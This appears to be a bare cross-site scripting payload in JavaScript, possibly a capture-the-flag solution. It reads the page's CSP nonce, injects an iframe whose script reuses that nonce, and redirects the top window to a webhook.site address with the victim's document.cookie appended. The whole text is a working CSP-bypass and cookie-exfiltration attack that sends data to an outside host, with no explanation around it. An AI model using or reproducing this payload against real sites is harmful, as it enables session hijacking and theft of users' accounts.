var nonce = parent.document.querySelector('script').nonce;
var iframe = parent.document.createElement('iframe');
iframe.srcdoc = '<script nonce="' + nonce + '">parent.parent.location="https://webhook.site/ton-id?c="+parent.parent.document.cookie</script>';
parent.document.body.appendChild(iframe);
